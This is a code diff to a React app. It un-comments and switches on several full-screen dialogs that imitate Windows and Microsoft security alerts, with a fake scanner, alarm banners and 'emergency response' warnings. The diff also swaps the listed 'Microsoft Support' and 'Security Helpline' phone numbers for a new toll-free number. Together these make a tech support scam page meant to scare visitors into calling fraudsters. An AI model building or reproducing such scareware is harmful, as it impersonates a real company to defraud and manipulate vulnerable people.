@@ -176,8 +176,8 @@ const App = () => {
       <TooltipProvider>
         <Toaster />
         <Sonner />
-        
-        {/* <Dialog open={showScanner}>
+
+        <Dialog open={showScanner}>
           <DialogContent className="max-w-[500px] bg-white border border-gray-300 shadow-xl" style={{ backgroundColor: 'white' }}>
             <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-4 -m-6 mb-4">
               <div className="flex items-center gap-3">
@@ -235,7 +235,7 @@ const App = () => {
           </DialogContent>
         </Dialog>
 
-        
+
         <Dialog open={showTopOverlay}>
           <DialogContent className="fixed top-10 w-full rounded-none border-0 bg-black text-white p-3 text-center z-[150]" style={{ backgroundColor: 'black' }}>
             <div className="flex flex-col items-center justify-center">
@@ -247,7 +247,7 @@ const App = () => {
           </DialogContent>
         </Dialog>
 
-        
+
         <Dialog open={showModal}>
           <DialogContent className="max-w-[550px] h-[550px] border-0 rounded-none" style={{ backgroundColor: '#1873e8' }}>
             <div className="w-full h-full flex items-center justify-center rounded-none">
@@ -290,7 +290,7 @@ const App = () => {
           </DialogContent>
         </Dialog>
 
-        
+
         <Dialog open={showMainDialog}>
           <DialogContent className="max-w-[400px]" style={{ backgroundColor: 'white' }}>
             <DialogHeader>
@@ -317,7 +317,7 @@ const App = () => {
                   <p className="text-blue-700 font-medium text-sm space-y-2">
                     Contact Windows Support :
                     <span className="ml-2 inline-block px-2 py-0.5 border border-gray-300 rounded bg-gray-50 text-gray-800">
-                      +1-888-203-0975 (Security Helpline)
+                      1833 6249 802 (Security Helpline)
                     </span>
                   </p>
                 </div>
@@ -340,7 +340,7 @@ const App = () => {
           </DialogContent>
         </Dialog>
 
-        
+
         <Dialog open={showBackgroundModals[0]}>
           <DialogContent className="max-w-[500px] bg-blue-900/95 backdrop-blur-sm border border-blue-700 rounded-lg shadow-2xl" style={{ backgroundColor: 'rgba(30, 58, 138, 0.95)' }}>
             <div className="text-white space-y-4">
@@ -497,7 +497,7 @@ const App = () => {
 
               <div className="bg-[#1873e8]/50 p-3 rounded border border-[#1873e8]/70 animate-pulse">
                 <p className="text-xs font-bold text-white text-center">⚠️ IMMEDIATE EMERGENCY RESPONSE REQUIRED ⚠️</p>
-                <p className="text-xs text-center">Call Microsoft Support: +1-888-203-0975</p>
+                <p className="text-xs text-center">Call Microsoft Support: 1833 6249 802</p>
               </div>
             </div>
           </DialogContent>
@@ -507,7 +507,7 @@ const App = () => {
           <div className="fixed flex-col bottom-0 left-0 w-screen bg-[#1873e8] text-white flex justify-center items-center z-[100] py-1">
             <div className="flex items-center justify-center gap-10 py-1">
               <img className="w-20" src={img5} alt="" />
-              <h2 className="new-font">Contact Support 1-8702288568 (Toll Free)</h2>
+              <h2 className="new-font">Contact Support 1833 6249 802 (Toll Free)</h2>
             </div>
             <p className=" text-xs px-2">
               Warning! An unrecognized app from starting. Running this app might
@@ -517,7 +517,7 @@ const App = () => {
               pictures or documents.
             </p>
           </div>
-        )} */}
+        )}
 
         <BrowserRouter>
           <Routes>
